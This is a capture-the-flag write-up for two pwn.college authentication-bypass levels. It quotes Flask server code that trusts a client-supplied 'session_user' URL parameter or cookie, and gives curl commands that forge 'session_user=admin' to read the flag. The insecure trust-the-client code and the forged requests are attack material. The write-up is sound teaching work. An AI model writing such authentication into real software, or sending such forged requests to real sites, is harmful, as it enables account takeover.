---
tags: ["Web Security", "Authentication"]
title: "Authentication Bypass"
description: Authentication Bypass
reference: https://pwn.college/intro-to-cybersecurity/web-security/
---

# 1

## Description

Of course, web applications can have security vulnerabilities that have nothing to do with the shell. A common type of vulnerability is an Authentication Bypass, where an attacker can bypass the typical authentication logic of an application and log in without knowing the necessary user credentials.

This level challenges you to explore one such scenario. This specific scenario arises because, again, of a gap between what the developer expects (that the URL parameters set by the application will only be set by the application itself) and the reality (that attackers can craft HTTP requests to their hearts content).

This level assumes a passing familiarity with SQL, which you can develop in the SQL Playground. SQL will become incredibly relevant later, but for now, it is an incidental part of the challenge.

Anyways, go and bypass this authentication to log in as the admin user and get the flag!

## Solution

1. read the server code

client can set `session_user=admin` without knowing the username and password.

```python
@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    return flask.redirect(f"""{flask.request.path}?session_user={username}""")


@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.args.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """
```

2. 

```
curl challenge.localhost?session_user=admin
```

---

# 1

## Description

Authentication bypasses are not always so trivial. Sometimes, the logic of the application might look correct, but again, the gap between what the developer expects to be true and what will actually be true rears its ugly head. Give this level a try, and remember: you control the requests, including all the HTTP headers sent!

## Solution

1. read the server code

```python
@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.cookies.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """
```

2. send request with cookie `session_user=admin`

```
curl --cookie "session_user=admin" challenge.localhost
```
